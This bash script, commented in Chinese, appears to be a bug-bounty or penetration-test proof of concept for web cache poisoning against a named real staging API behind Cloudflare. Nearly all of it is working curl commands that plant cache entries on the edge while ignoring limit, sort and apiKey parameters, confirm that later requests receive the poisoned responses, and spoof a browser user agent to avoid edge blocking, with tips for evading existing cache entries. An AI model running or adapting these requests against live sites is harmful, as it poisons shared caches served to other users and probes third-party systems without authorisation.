#!/usr/bin/env bash
# Fanatical da-pre Dynamic Ads Products API — Cloudflare 边缘缓存键忽略 limit/sort/apiKey（Web Cache Poisoning）
# 目标: https://da-pre.fanatical.com（Cloudflare Worker 前置, x-is-cf-worker: 1；生产 da.fanatical.com 同路由需鉴权）
# 同端点背景: da-pre 预发布未校验 apiKey, 匿名即可读商品 JSON。
# 本脚本: 证明边缘缓存按字面路径建键, query 的 limit/sort/apiKey/未知参数都不参与。

# 前置:
#   - 公网可达, 无需 Cookie / Authorization / apiKey
#   - 浏览器类 UA（裸 curl UA 可能被边缘拦）
#   - 同一 Cloudflare colo（看响应头 cf-ray 后缀, 例如 ...-LAX）；不同 colo 缓存独立
#   - 每个字面路径是独立缓存槽: /api/v1/products、/api/v1/products.kkk、.zzz、.json、.foo ……
#     Worker 会剥离后缀交给同一路由, 但边缘按字面 path 建键
#
# 判据（缺一不可）:
#   1) 未用过的路径变体首请求: cf-cache-status: MISS（或无该头）
#   2) 同路径换 limit 再请求: HIT 且 bytes/条数与首请求完全一致（limit 不在键）
#   3) 带 sort=price-low-to-high 仍返回既有条目（不重排）（sort 不在键）
#   4) 带/不带 apiKey 命中同一条目（apiKey 不在键）
#   5) 换未知参数 h/z 仍 HIT（未知参数不在键）
#   6) 响应自身 Cache-Control 可能是 no-store —— 边缘仍缓存, 必须二次请求看 cf-cache-status
#   7) 对照生产 da: 401 且无 cf-cache-status（不构成生产鉴权绕过）
#
# 失败常见原因:
#   a) 用了别人已缓存的路径 → 直接 HIT 旧条目, 换一个未用过的后缀变体
#   b) 跨 colo（cf-ray 后缀变了）→ 各 colo 独立缓存, 会 MISS
#   c) 裸 curl UA 被边缘 403/拦 → 换浏览器 UA
#   d) 只看 Cache-Control: no-store 就判「不可投毒」→ 假阴性
#   e) 把生产 da 的 401 当投毒面 → 实测生产 401 未被缓存

set -u
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36}"
HOST="da-pre.fanatical.com"
PROD="da.fanatical.com"
OUT="$(mktemp -d)"

uuid() { python3 -c 'import uuid;print(uuid.uuid4().hex[:12])' 2>/dev/null || echo "$RANDOM$RANDOM"; }
hdr()  { grep -iE '^(HTTP/|cf-cache-status:|age:|cache-control:|cf-ray:|x-is-cf-worker:)' "$1" | tr -d '\r'; }
cnt()  { python3 -c 'import json,sys;d=json.load(open(sys.argv[1]));print(len(d) if isinstance(d,list) else "non-list")' "$1"; }

# ---------- 0) 基线: da-pre 匿名 200; 生产 da 401 且无缓存头 ----------
curl -sk -A "$UA" -D "$OUT/h0.txt" -o "$OUT/r0.json" "https://$HOST/api/v1/products"
hdr "$OUT/h0.txt"; echo "pre items=$(cnt "$OUT/r0.json") bytes=$(wc -c <"$OUT/r0.json")"
curl -sk -A "$UA" -D "$OUT/hp.txt" -o "$OUT/rp.json" "https://$PROD/api/v1/products"
hdr "$OUT/hp.txt"; echo "prod bytes=$(wc -c <"$OUT/rp.json") body=$(cat "$OUT/rp.json")"
# 期望: pre 200（20 条左右）；prod HTTP 401、24 bytes {"error":"Unauthorized"}、无 cf-cache-status

# ---------- 1) 用新后缀变体建「1 条」缓存条目 ----------
V1=".kkk"   # 换成从未请求过的后缀; 若这里已经是 HIT, 换 .json/.foo/.zzz 等其他变体
U1="$(uuid)"
curl -sk -A "$UA" --path-as-is -D "$OUT/h1.txt" -o "$OUT/r1.json" \
  "https://$HOST/api/v1/products$V1?limit=1&cc=CA&h=$U1"
hdr "$OUT/h1.txt"; echo "step1 items=$(cnt "$OUT/r1.json") bytes=$(wc -c <"$OUT/r1.json")"
# 期望: HTTP 200、约 7292 bytes、1 条商品、cf-cache-status: MISS（或无该头）

# ---------- 2) 同路径换 limit=20 → 仍拿到首请求固定的 1 条 ----------
U2="$(uuid)"
curl -sk -A "$UA" --path-as-is -D "$OUT/h2.txt" -o "$OUT/r2.json" \
  "https://$HOST/api/v1/products$V1?limit=20&cc=CA&h=$U2"
hdr "$OUT/h2.txt"; echo "step2 items=$(cnt "$OUT/r2.json") bytes=$(wc -c <"$OUT/r2.json")"
# 期望: cf-cache-status: HIT, items=1, bytes 与 step1 完全一致（实测 7292B）
# 若 items=20 → limit 在该 colo 的缓存键里, 本条不成立（先检查 cf-ray 是否同 colo）

# ---------- 3) 同路径 limit=50&sort=price-low-to-high → 命中既有条目（sort 不生效） ----------
curl -sk -A "$UA" --path-as-is -D "$OUT/h3.txt" -o "$OUT/r3.json" \
  "https://$HOST/api/v1/products$V1?limit=50&sort=price-low-to-high&cc=CA&h=$U2"
hdr "$OUT/h3.txt"; echo "step3 items=$(cnt "$OUT/r3.json") bytes=$(wc -c <"$OUT/r3.json")"
# 实测: HIT 既有 20 条条目（137964 bytes, age: 2）, 不是本请求指定的 50 条, 也未按 price-low-to-high 重排
# → 返回内容由该路径当前缓存条目决定, query 语义被忽略

# ---------- 4) apiKey 不在缓存键: 换另一个新后缀建 1 条条目 ----------
V2=".zzz"
U3="$(uuid)"
curl -sk -A "$UA" --path-as-is -D "$OUT/h4.txt" -o "$OUT/r4.json" \
  "https://$HOST/api/v1/products$V2?apiKey=AAA&limit=1&cc=JP&h=$U3"
hdr "$OUT/h4.txt"; echo "step4 items=$(cnt "$OUT/r4.json") bytes=$(wc -c <"$OUT/r4.json")"

# ---------- 5) 不带 apiKey、不同 limit、换未知参数 → 命中同一条目 ----------
U4="$(uuid)"
curl -sk -A "$UA" --path-as-is -D "$OUT/h5.txt" -o "$OUT/r5.json" \
  "https://$HOST/api/v1/products$V2?limit=3&cc=JP&z=$U4"
hdr "$OUT/h5.txt"; echo "step5 items=$(cnt "$OUT/r5.json") bytes=$(wc -c <"$OUT/r5.json")"
# 期望: HIT 且 items=1（与 step4 同一条目）→ apiKey / limit / 未知 z 均不在缓存键

# ---------- 6) 生产对照（可重复多次, 含 .json/.zzz 等变体） ----------
for p in "/api/v1/products" "/api/v1/products.json" "/api/v1/products.zzz"; do
  curl -sk -A "$UA" --path-as-is -D "$OUT/hpc.txt" -o "$OUT/rpc.txt" "https://$PROD$p"
  echo "prod $p -> $(grep -iE '^HTTP/' "$OUT/hpc.txt" | tail -1 | tr -d '\r') bytes=$(wc -c <"$OUT/rpc.txt") $(grep -i 'cf-cache-status' "$OUT/hpc.txt" | tr -d '\r')"
done
# 期望: 全部 401 24B、无 cf-cache-status → 生产侧未观察到缓存 200, 不构成生产鉴权绕过

echo "[i] 原始响应目录: $OUT"